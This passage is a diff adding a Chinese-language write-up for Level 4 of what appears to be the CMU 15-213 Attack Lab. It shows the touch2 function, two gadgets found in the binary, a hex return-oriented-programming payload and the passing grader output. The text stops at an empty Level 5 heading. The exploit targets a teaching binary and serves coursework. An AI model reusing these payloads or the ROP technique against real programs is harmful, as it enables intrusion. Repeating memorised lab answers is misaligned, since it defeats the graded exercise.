@@ -459,3 +459,81 @@ PASS: Would have posted the following:
 	result	1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 
 ```
 
+
+
+## Part II: Return-Oriented Programming
+
+### Level 4 
+
+Level 4要求我們執行`rtarget`，並將函式反回到`touch2`，整體過程與Level 2相似，不過由於可執行區的限制，我們不能直接執行注入的字串，而要使用ROP的方式將程式導向已存在並編譯過的內部程式
+
+> 開始前請先閱讀attacklab.pdf的Return-Oriented Programmingr簡介
+
+
+
+首先看看`touch2`，我們需要將`%rdi`賦值成`0x59b997fa`
+
+```c
+void touch2(unsigned val){
+    vlevel = 2;
+    if(val == cookie){
+        printf("Touch2!: You called touch2(0x%.8x)\n", val);
+        validate(2);
+    }else{
+        printf("Misfire: You called touch2(0x%.8x)\n", val);
+        fail(2);
+    }
+    exit(0);
+}
+```
+
+
+
+查找相應的`gadgets`
+
+```asm
+00000000004019a0 <addval_273>:
+  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+  4019a6:	c3                   	retq   
+
+00000000004019a7 <addval_219>:
+  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+  4019ad:	c3                   	retq   
+```
+
+
+
+編寫`touch4.txt`
+
+```
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+ab 19 40 00 00 00 00 00
+fa 97 b9 59 00 00 00 00
+a2 19 40 00 00 00 00 00
+ec 17 40 00 00 00 00 00
+```
+
+
+
+運行結果
+
+```
+Cookie: 0x59b997fa
+Type string:Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target rtarget
+PASS: Would have posted the following:
+	user id	bovik
+	course	15213-f15
+	lab	attacklab
+	result	1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 
+
+```
+
+
+
+### Level 5
+
